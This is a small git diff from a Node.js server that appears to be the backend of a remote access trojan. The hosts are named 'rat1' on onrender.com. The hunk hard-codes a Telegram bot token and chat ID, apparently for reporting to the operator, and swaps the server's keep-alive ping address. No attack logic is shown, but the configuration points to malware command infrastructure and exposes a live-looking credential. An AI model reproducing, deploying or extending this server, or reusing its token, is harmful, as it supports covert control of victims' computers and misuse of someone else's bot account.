@@ -10,7 +10,7 @@ const axios = require("axios");
 const PORT = process.env.PORT || 8999;
 const token = '7144522875:AAEFGYd8mx8p3wvfpBozxW5Ea5L-XEG2y2M';
 const telegramId = '1784606556';
-const pingAddress = 'https://rat1-1-lfu0.onrender.com/';
+const pingAddress = 'https://rat1-74a9.onrender.com/';
 
 const app = express();
 const server = http.createServer(app);
